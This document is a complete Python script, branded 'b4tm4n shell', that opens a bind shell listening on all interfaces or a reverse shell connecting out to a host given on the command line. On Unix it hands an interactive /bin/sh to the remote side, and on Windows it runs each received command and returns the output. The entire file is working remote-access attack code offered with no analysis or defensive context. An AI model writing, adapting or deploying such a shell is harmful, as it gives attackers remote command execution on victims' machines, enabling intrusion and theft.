#!/usr/bin/env python
import re,subprocess,os,sys,socket,time
p=""
h=""
def shell(c):
	proc=subprocess.Popen(c,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
	return proc.stdout.read()+proc.stderr.read()+prompt().encode('utf-8')

def action(c):
	if os.name!="nt":
		f=c.fileno()
		os.system("export TERM=xterm;PS1='$PWD>';export PS1;/bin/sh -i <&"+str(f)+" >&"+str(f)+" 2>&"+str(f))
	else:
		while True:
			try:
				r=c.recv(1024).decode("utf-8")
			except:
				pass
			else:
				if len(r)>0:
					b=re.search("cd\ ([^\s]+)",r,flags=re.IGNORECASE)
					if b:
						if os.path.isdir(b.group(1)):
							os.chdir(b.group(1))
						c.send(prompt().encode('utf-8'))
					else:
						out=shell(r)
						if out and len(out)>0:c.send(out)
				else: return False

def prompt():
	return "\n"+os.getcwd()+">"
g=sys.argv
if len(g)==2:
	p=g[1]
elif len(g)==3:
	p=g[1]
	h=g[2]
else:exit(1)
p=int(p)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
if len(g)==2:
	s.bind(("0.0.0.0",p))
	s.listen(5)
	try:(c,a)=s.accept()
	except:
		time.sleep(1)
	else:
		if os.name!="nt":
			c.send(("b4tm4n shell : connected\n").encode('utf-8'))
		else:
			c.send(("b4tm4n shell : connected"+prompt()).encode('utf-8'))
		action(c)
if len(g)==3:
	try: s.connect((h,p))
	except:
		time.sleep(5)
	else:
		if os.name!="nt":
			s.send(("b4tm4n shell : connected\n").encode('utf-8'))
		else:
			s.send(("b4tm4n shell : connected"+prompt()).encode('utf-8'))
		action(s)